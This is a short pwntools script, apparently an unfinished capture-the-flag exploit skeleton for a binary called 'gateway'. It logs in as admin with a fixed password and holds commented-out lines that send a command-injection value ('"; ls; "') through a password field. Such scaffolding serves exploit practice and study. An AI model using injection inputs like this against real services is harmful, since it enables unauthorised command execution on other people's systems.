#!/usr/bin/python3

from pwn import *

exe = ELF('gateway', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x14E01

        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()
sla(b'name: ', b'admin')
sla(b'word: ', b'123456')
# sla(b'> ', b'5')
# sla(b'word: ', b'"; ls; "ls')
# sla(b'> ', b'1')


p.interactive()
